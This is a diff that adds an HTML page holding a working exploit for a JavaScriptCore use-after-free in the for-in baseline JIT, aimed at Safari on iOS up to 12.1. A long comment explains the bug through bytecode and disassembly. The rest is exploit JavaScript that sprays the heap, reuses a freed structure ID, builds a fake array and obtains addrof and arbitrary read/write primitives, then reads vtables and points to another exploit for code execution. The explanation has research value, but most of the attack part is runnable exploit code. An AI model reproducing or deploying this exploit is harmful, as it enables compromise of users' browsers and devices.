@@ -1,0 +1,592 @@
+<html>
+<body>
+<script src="ibin.js"></script>
+<script>
+/*
+
+	Disclaimer: I did not discover the bug used in the exploit.
+
+	This is an exploit for a JavaScriptCore (JSC) use after free bug
+	in forin loop baseline jit fixed in
+		https://github.com/WebKit/webkit/commit/011860e5cb6a702a987545580eb698efa34ace4e.
+ 
+	The exploit targets Safari on iOS up to 12.1, it achieves arbitrary read/write within
+	WebCore process.
+
+	For detail on JavaScriptCore internals referred in this write up you 
+	can consult a phrack article 
+
+		http://www.phrack.org/papers/attacking_javascript_engines.html
+ 
+	To better understand the issue we start with a bit of background on how forin is implemented.
+
+	To facilitate forin implementation JSC has JSPropertyEnumerator (runtime/JSPropertyEnumerator.h)
+	class. The class is a JSCell, which means, its lifetime is managed by the garbage collector. It's 
+	main purpose is to speed up the loop by caching certain offsets associated with
+	the structure of the object it loops through. One of the fields is the structureID which
+	is used to verify that the enumerator is dealing with object of proper structure and all
+	the offsets cached are valid. The verification is done, as we are going to see later,
+	by directly comparing the cached structure id with the on present in the object it enumerates.
+
+	As any cell in JSC which references other cells it needs to make sure the references are alive
+	when being used. To do that there is a visitChildren method which is called by the
+	garbage collector while it marks alive objects on the heap. As we can see JSPropertyEnumerator,
+	prior the patch, was marking JSString objects from m_propertyNames, yet leaving the possibility
+	of the structure referenced via m_cachedStructureID member being swept, since Structure objects
+	are JSCell as well, resulting into a possible use after free of the Structure object referenced
+	by m_cachedStructureID.
+
+	Also the Structure object caches corresponding JSPropertyEnumerator
+	object as well. When we first enter forin loop with a structure 
+	a new JSPropertyEnumerator is created and stored as part of 
+	the Structure object and is reused during further uses of the Structure 
+	object as a part of the forin loops.
+
+	Now lets try to understand how the test case from the sample utilizes the that bug. 
+	Lets consider a simple function using a forin loop.
+
+	function foo(o, t) {
+	 for (let p in o) {
+		return t[p];
+	 }
+	}
+
+	The bug is triggered once the function is compiled into baseline jit.
+	Baseline jit is essentially direct conversion  of bytecode into assembly. 
+	Some byte codes are just calls to C++ runtime and some have custom 
+	assembly to back them up (see jit/JITOpcodes.cpp for detail on those). 
+	We will just go through the bytecode itself, and refer to assembly version
+	when necessary. (You can use JavaScripCode command line interpreter
+	to dump both bytecode and jit disassembly). We will only describe the
+	part relevant to the bug and skip the rest.
+
+		[   0] enter             
+		[   1] get_scope         loc3
+		[   3] mov               loc4, loc3
+		[   6] check_traps       
+		[   7] mov               loc6, <JSValue()>(const0)
+		[  10] mov               loc7, arg1
+
+		   Create JSPropertyEnumerator object and cache it with in 
+		   the coresponding structure, enumerator is stored in loc8
+		[  13] op_get_property_enumerator loc8, loc7
+
+		   Get how many properties the object has in loc9 
+		[  16] op_get_enumerable_length loc9, loc8
+		   First we run a loop which checks if there any indexed
+		   properties corresponding to indexes lower then loc9
+		[  19] mov               loc10, Int32: 0(const1)
+		[  22] loop_hint         
+		[  23] check_traps       
+		[  24] less              loc12, loc10, loc9
+		[  28] jfalse            loc12, 33(->61)
+
+			Check if object has properties accessible as array elements
+		[  31] op_has_indexed_property loc12, loc7, loc10    Original
+
+			In our case we don't have such properties, so always false 
+			here. Hence we are going to skip the loop here for every index
+			and eventually end up at 61.
+		[  36] jfalse            loc12, 19(->55)
+		[  39] op_to_index_string loc11, loc10
+		[  42] mov               loc6, loc11
+		[  45] op_check_tdz      loc6
+		[  47] get_by_val        loc13, arg2, loc10    Original; predicting None
+		[  53] ret               loc13
+		[  55] inc               loc10
+		[  57] jmp               -35(->22)
+		[  59] jmp               91(->150)
+		[  61] mov               loc10, Int32: 0(const1)
+			Check that index in loc10 is less them maximum amount
+			of properties available in Structure of object at loc8.
+			(To make better sense out of the disassembly it's useful to 
+			refer to corresponding implementation in jit/JITOpcodes.cpp,
+			which gives you an idea which register is what)
+		[  64] op_enumerator_structure_pname loc11, loc8, loc10
+				  0x7fc45b100088: mov -0x58(%rbp), %rax <- object
+				  0x7fc45b10008c: mov -0x48(%rbp), %rsi <- JSPropertyEnumerator
+				  0x7fc45b100090: cmp 0x2c(%rsi), %eax  0x2c is the limit in 
+								JSPropertyEnumerator object
+				  0x7fc45b100093: jb 0x7fc45b1000a8
+				  0x7fc45b100099: mov $0x2, %rax
+				  0x7fc45b1000a3: jmp 0x7fc45b1000b3
+				If we are in limits, load property names vector
+				into rsi and retrieve name object using the index
+				in the vector. In our case the name is going to be
+				just an index into inlined properties of the object.
+				  0x7fc45b1000a8: mov 0x8(%rsi), %rsi
+				  0x7fc45b1000ac: movsxd %eax, %rax
+				  0x7fc45b1000af: mov (%rsi,%rax,8), %rax
+				  0x7fc45b1000b3: mov %rax, -0x60(%rbp)
+		[  68] loop_hint         
+		[  69] check_traps       
+		[  70] eq_null           loc12, loc11
+		[  73] jtrue             loc12, 35(->108)
+
+				If property name is not null, check that the structure
+				id of the object is the same as the one cached in enumerator.
+		[  76] op_has_structure_property loc12, loc7, loc11, loc8
+				  0x7fc45b100203: mov -0x40(%rbp), %rax
+				  0x7fc45b100207: mov -0x48(%rbp), %rsi
+				  0x7fc45b10020b: test %rax, %r15
+				  0x7fc45b10020e: jnz 0x7fc45b100b76
+				  0x7fc45b100214: mov (%rax), %eax
+				check if structure of arg1 is the same as enumerator
+				  0x7fc45b100216: cmp 0x18(%rsi), %eax
+				  0x7fc45b100219: jnz 0x7fc45b100b76
+				set loc12 to false
+				  0x7fc45b10021f: mov $0x7, %rax
+				  0x7fc45b100229: mov %rax, -0x68(%rbp)
+		[  81] jfalse            loc12, 17(->98)
+		[  84] mov               loc6, loc11
+		[  87] op_check_tdz      loc6
+		[  89] op_get_direct_pname loc13, arg2, loc6, loc10, loc8    predicting None
+					obj to rax
+				  0x7fc45b100304: mov 0x30(%rbp), %rax
+				  0x7fc45b100308: test %rax, %r15
+					check if rax is a cell
+				  0x7fc45b10030b: jnz 0x7fc45b100c24
+					enumerator to rdx
+				  0x7fc45b100311: mov -0x48(%rbp), %rdx
+				  0x7fc45b100315: mov (%rax), %esi
+					check that the arg2 has the same structure id 
+					as the enumerator
+				  0x7fc45b100317: cmp 0x18(%rdx), %esi
+					slow path if not
+				  0x7fc45b10031a: jnz 0x7fc45b100c24
+				  0x7fc45b100320: mov -0x58(%rbp), %rsi
+					check if property index is within objects
+					inline capacity
+				  0x7fc45b100324: cmp 0x34(%rdx), %esi
+				  0x7fc45b100327: jae 0x7fc45b10033d
+					if we are, shift to start of inlined properties
+				  0x7fc45b10032d: add $0x10, %rax
+				  0x7fc45b100331: movsxd %esi, %rsi
+					load property and exit
+				  0x7fc45b100334: mov (%rax,%rsi,8), %rax
+				  0x7fc45b100338: jmp 0x7fc45b10034e
+				  0x7fc45b10033d: mov 0x8(%rax), %rax
+				  0x7fc45b100341: sub 0x34(%rdx), %esi
+				  0x7fc45b100344: neg %esi
+				  0x7fc45b100346: movsxd %esi, %rsi
+				  0x7fc45b100349: mov -0x10(%rax,%rsi,8), %rax
+				  0x7fc45b10034e: mov %rax, 0x7fc49b1e6a60
+				  0x7fc45b100358: mov %rax, -0x70(%rbp)
+				return retrieved property.
+		[  96] ret               loc13
+		[  98] inc               loc10
+		[ 100] op_enumerator_structure_pname loc11, loc8, loc10
+		[ 104] jmp               -36(->68)
+		[ 106] jmp               44(->150)
+		[ 108] op_enumerator_generic_pname loc11, loc8, loc10
+		[ 112] loop_hint         
+		[ 113] check_traps       
+		[ 114] eq_null           loc12, loc11
+		[ 117] jtrue             loc12, 33(->150)
+		[ 120] op_has_generic_property loc12, loc7, loc11
+		[ 124] jfalse            loc12, 16(->140)
+		[ 127] mov               loc6, loc11
+		[ 130] op_check_tdz      loc6
+		[ 132] get_by_val        loc13, arg2, loc6    Original; predicting None
+		[ 138] ret               loc13
+		[ 140] inc               loc10
+		[ 142] op_enumerator_generic_pname loc11, loc8, loc10
+		[ 146] jmp               -34(->112)
+		[ 148] jmp               2(->150)
+		[ 150] ret               Undefined(const2)
+
+	From the bytecode above lets highlight the most important parts of the
+	function execution flow while enumerating an object with only inlined properties 
+	and both arguments have same structure. For instance a call like this
+		foo({a:1}, {a:2});
+
+	1. Get (create) the enumerator for o. It will cache the structure id and
+	number of the inlined properties.
+ 
+	2. Start iterating from 0 to the maximum number of inlined properties,
+	retrieved from the enumerator.
+
+	3. Execute op_get_direct_pname to retrieve first inlined property of t via 
+	index from enumerator, while checking that the index is within limits
+	and the structure id of t is the same as in enumerator.
+
+	4. Return the retrieved value.
+
+	Let modify our function in the following way.
+
+	function foo(o, t) {
+	 for (let p in o) {
+		evil_function();
+		return t[p];
+	 }
+	}
+
+	It will an extra step between 2 and 3 (2.1), namely calling function 
+	evil_function, the rest remains the same.
+
+	Lets assume o and t have different structures (meaning we should take
+	the slow path in op_get_direct_pname). In evil_function we can mutate
+	o so it changes the structure, trigger garbage collection
+	so the structure gets freed (yet still referenced in enumerator), 
+	mutate t till its structure reuses object o former structure id.
+   
+	After that in step 4 it is still going to use cached structure id 
+	from enumerator and retrieve the inlined property directly via index
+	(since t will have the same structure id and the check will pass).
+	In the case, for instance, when original o had one inlined property 
+	and the new t had none it is going to retrieve whatever placed after
+	t butterfly and treat it as a JSValue.
+   
+	Now lets outline the rough plan on how to achieve arbitrary read/write
+	using the out of bound read described above (we assume 64-bit platform).
+
+	First we force the javascripe engine to produce base line git for foo.
+	o is going to be an object with two inlined properties. t is an 
+	array with no inlined properties. When allocated, o will look something
+	like this.
+
+   0        8      10        18
+   | o cell | null | o prop1 | o prop2 |
+
+	Before trying to access the second property during the enumeration
+	we trigger evil_function. We allocate t in such a way that it is followed
+	by another array t1. 
+
+   0        8             10        18
+   | t cell | t butterfly | t1 cell | t1 butterfly |
+
+	so at t + 0x18 we are going to have t1's butterfly. The second inlined
+	property would have been located at t + 0x18 as well. So when 
+	op_get_direct_pname attempt to directly retrieve it, it's going to interpret
+	t1 butterfly as a JSValue. 
+
+	We craft t1 butterfly so its fake cell value corresponds to an unboxed array 
+	and set its butterfly to an object. This way we end up with read/write on 
+	arbitrary javascript object, which can quite easy can be converted to 
+	arbitrary read/write.
+
+	Following is the source code implementing the outlined strategy.
+*/
+
+const STRUCT_ID = 0x800;
+const ZONE = 0x2F;
+const ZONE_SPAM = 0x40;
+
+// Arbitrary r/w, addrof/matrialize helper taken from [1].
+var iRW = function (boxed, unboxed, idx) {
+	this.boxed   = boxed;
+	this.unboxed = unboxed;
+	this.idx  = idx;
+
+	let slavePad = new Array(0x10);
+
+	for (var i=0; i<slavePad.length; i++) {
+		let f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
+		p6:bh.toF64JSValue(0x10000, 0x10000)};	
+		slavePad[i] = f;
+	}
+	let slave = slavePad.pop();
+	slave[0] = 1.1;
+	slave.X = 1.1;
+
+	let cellArrDouble = bh.toF64JSValue(0x01082107, STRUCT_ID);
+
+	let container = {};
+	container.p0 = cellArrDouble;
+	container.p1 = slave;
+
+	let caddr = this.addrof(container);
+
+	let master  = this.materialize(bh.f64AddU32(caddr, 0x10));
+
+	this.slave     = slave;
+	this.master    = master;
+	this.container = container;
+	this.slaveBfly = master[1];
+
+	this.remaster();
+}
+
+iRW.prototype.addrof = function (o) {
+	this.boxed[0] = o;
+	return this.unboxed[this.idx];
+}
+
+iRW.prototype.materialize = function (a) {
+	this.unboxed[this.idx] = a;
+	return this.boxed[0];
+}
+
+iRW.prototype.write64 = function (a, v) {
+	// overwrite slaves buterfly
+	this.master[1] = bh.f64AddU32(a, 0x10);
+	this.slave.X = this.materialize(v);
+	this.master[1] = this.slaveBfly;
+}
+
+iRW.prototype.read64 = function(a) {
+	let addr = bh.f64AddU32(a, 0x10);
+	this.master[1] = addr;
+	let ret = this.addrof(this.slave.X);
+	this.master[1] = this.slaveBfly;
+	return ret;
+}
+
+// change master's cell to an unboxed array with no properties
+// which is going to help us survive garbage collection
+// in case we need it. 
+iRW.prototype.remaster = function() {
+	let unboxed = [];
+	unboxed[0] = 1.1;
+
+	let cell = this.read64AtObj(unboxed);
+	this.container.p0 = bh.f64JSValue(cell);
+}
+
+iRW.prototype.read64AtObj = function(o, off=0) {
+	let a = this.addrof(o);
+	a = bh.f64AddU32(a, off);
+	return this.read64(a);
+}
+
+iRW.prototype.test = function() {
+	let o = [];
+	o[0] = 1.1;
+	let bfly = this.read64AtObj(o, 8);
+
+	this.write64(bfly, 2.2);
+	let x1 = this.read64(bfly);
+
+	return x1 === 2.2;
+}
+
+function print(msg) {
+	alert(msg);
+}
+
+// triggers garbage collection
+function __gc() {
+	for (var i=0; i<0x100; i++) {
+		new Uint32Array(0x100 * 0x100);
+	}
+}
+
+var evil_function = function (tmp, refill) {
+	// modify tmp structure, so we can refill 
+	tmp.__proto__ = {};
+	__gc();
+	// clain former structure of tmp
+	refill.__proto__ = {};
+}
+
+function foo(tmp, refill) {
+
+	var result=0;
+	var i=0;
+	for (let k in tmp) {
+		if (i > 0) {
+			evil_function(tmp, refill);
+		}
+		// if i > 0, at this point refill has the same
+		// structure as tmp had before, meaning
+		// the id check is going to pass
+		// and m_cachedInlineCapacity is going to be 
+		// used to read k as an inline property on refill
+		result = refill[k];
+		i++;
+	}
+
+	return result;
+}
+
+if (!confirm("go?")) {
+	throw new Error("no go");
+}
+
+__gc();
+
+// force JavaScriptCore to produce baseline jit for foo
+for (var i=0; i<100; i++) {
+	foo({a:1.1}, {a:1.1});
+}
+
+let cellArrDouble = bh.toF64JSValue(0x01082107, STRUCT_ID);
+
+// craft an object which we are going to get r/w on. It should be prepender
+// by a proper butterfly header, so we spam some objects before
+// with | 0x10001 | 0x10000 | as the last property placed right before
+// our target forming a butterfly header with both the capacity 
+// the and public length 0x10001
+var objs = [];
+for (var i=0; i<0x100; i++) {
+	f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
+	p6:bh.toF64JSValue(0x10001, 0x10001)};	
+	objs[i] = f;
+}
+let unboxed = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
+	p6:bh.toF64JSValue(0x10001, 0x10001)};
+
+// spam arrays one after another so we have the butterfly 
+// at the position where enumerator expects a property,
+// so it gets interpreted as a javascript object
+// 
+// 0           8               0x10        0x18             0x20 
+// | arr1 cell | arr1 butterfly | arr2 cell | arr2 butterfly | ...
+var largeSpam = new Array(0x1000);
+for (var i=0; i<largeSpam.length; i++) {
+	// allocate butterfly in large allocations space
+	// so the address is 0x10 aligned, since all object
+	// addresses must be 0x10 aligned in JavaScriptCore	
+	var arr = new Array(0x400); 
+	// arrange fake object in the butterfly
+	// cell for the fake array
+	arr[0] = cellArrDouble;
+	// object we want to get a r/w is used as a butterfly
+	arr[1] = unboxed;
+	largeSpam[i] = arr;
+}
+
+// pick an array from the middle of the spammed area, for
+// the foo second argument
+refill = largeSpam[largeSpam.length/2];
+var structs = new Array(STRUCT_ID*2);
+
+// This serves two purposes. Firstly, we spam enough structures so
+// we can guess the structure id for our fake object. Secondly, we
+// want exhaust the pool of available structure ids. This comes 
+// handy when we need to refill the freed structure of object o.
+// 
+// Trigger the garbage collection so we don't have any unreferenced
+// object holding on to a structure id, since we need them aligned later on.
+__gc();
+for (var i=0; i<structs.length; i++) {
+	let z = [];
+	z[0] = 1.1;
+	z["p"+i] = 1.1;
+	structs[i] = z;
+}
+
+// Create an object with two inlined properties.
+target = {b:1.1, c: 1.1};
+// This one I did not quite figured out, just took it from the sample.
+// But, after some experiments, with  JavaScriptCore it turned out it 
+// has the following useful property.
+//
+// After reassigning __proto__ for the second time and triggering 
+// the garbage collection it's possible to reuse the initial object's
+// structure id. So here we reassign __proto__ the first time and
+// later on in evil_function to be able to reuse it.
+target.__proto__ = {};
+
+// Trigger the bug and materialize our fake array.
+var fakeDoubleArr = foo(target, refill, true);
+
+if (fakeDoubleArr == undefined) {
+	alert("could not spawn fake double, bailing ...");
+	throw new Error(":'(");
+}
+
+//alert(bh.f64ToStr(fakeDoubleArr));
+
+// spam boxed arrays with the same butterfly size
+// as we are planning to allocate for unboxed,
+// so the unboxed butterfly ends up in the same allocation zone,
+// and is followed by a butterfly of boxed array
+var arrs = new Array(0x100);
+for (var i=0; i<ZONE_SPAM; i++) {
+	var a = {};
+	a[ZONE] = {};
+	// we place (0x4141,i) touples, so later on
+	// we can detect which butterfly was placed after our
+	// butterfly with out of bound read/write
+	a[0] = bh.toF64(0x4141, i);
+	arrs[i] = a;
+}
+
+// Assign a double to allocate buttefly with unboxed
+// doubles
+unboxed[ZONE] = 1.1;
+
+// print the newly allocated butterfly of unboxed object
+print("bfly: " + bh.f64ToStr(fakeDoubleArr[1]));
+
+// now we are going to shift unboxed butterfly by +0x10 relative to
+// the original one and craft the buterfly header at +8,
+// set its length to 0x10001, so we get  out of bound read/write into
+// the area filled with boxed arrays butterflies we have access to.
+//
+// -8                  0        8        0xc       0x10
+//  | butterfly header |  el0   | 0x10001 | 0x10001 |  new butterfly items ...
+unboxed[1] = bh.toF64(0x10001, 0x10001);
+fakeDoubleArr[1] = bh.f64AddU32(fakeDoubleArr[1], 0x10);
+
+// spam more to make sure we grab the area after unboxed butterfly
+for (var i=ZONE_SPAM; i<ZONE_SPAM*2; i++) {
+	var a = {};
+	a[ZONE] = {};
+	// place a unique value for each array to be able to id it later
+	a[0] = bh.toF64(0x4141, i);
+	arrs[i] = a;
+}
+
+var boxed = null;
+var magicIdx = 0;
+
+// now using out of bound read we locate the boxed array 
+// we can read and write unboxed dobles to via unboxed.
+for (var i=0; i<ZONE*4; i++) {
+	if (unboxed[i]) {
+		let hi = bh.f64hi(unboxed[i]);
+		// check for our magic value
+		if (hi == 0x14141) {
+			let lo = bh.f64lo(unboxed[i]);
+			boxed = arrs[lo];
+			magicIdx = i;
+			break;
+		}
+	}
+}
+
+// now we can leak an arbitrary object address by placing
+// it into boxed 0 and then reading at magicIdx from unboxed,
+// and materialize a fake object by placing the address 
+// into unboxed at magicIdx and then reading it via boxed[0].
+
+// Having obtained addrof and materialize a fake object primitives, we craft
+// arbitrary read/write the same way as in Safari exploit
+// [1] https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1
+// by @_niklasb.
+print("magic: " + magicIdx.toString(16));
+let rw = new iRW(boxed, unboxed, magicIdx);
+
+// make sure our arbitrary read/write works
+print("rw test: " + rw.test());
+
+// Read some vtables, you should be able to see
+// authenticated pointer if you are on XS.
+var wrapper = document.createElement('div')
+
+var el = rw.read64AtObj(wrapper, 0x18);
+alert("el: " + bh.f64ToStr(el));
+
+var vtable = rw.read64(el);
+alert("vtable: " + bh.f64ToStr(vtable));
+
+let fn = rw.read64(vtable);
+fn = rw.read64(vtable);
+alert("fn: " + bh.f64ToStr(fn));
+
+let inst = rw.read64(fn);
+alert("inst: " + bh.f64ToStr(inst));
+
+// to get code execution refer to [1] for iPhones up to XS, 
+// XS models will require a different approach ...
+
+// Die, since we have fake object still referenced by the foo function,
+// so the garbage collection is going to try to walk
+// it causing a crash. There might be some other reasons as well ...
+
+</script>
+</body>
+</html>
+
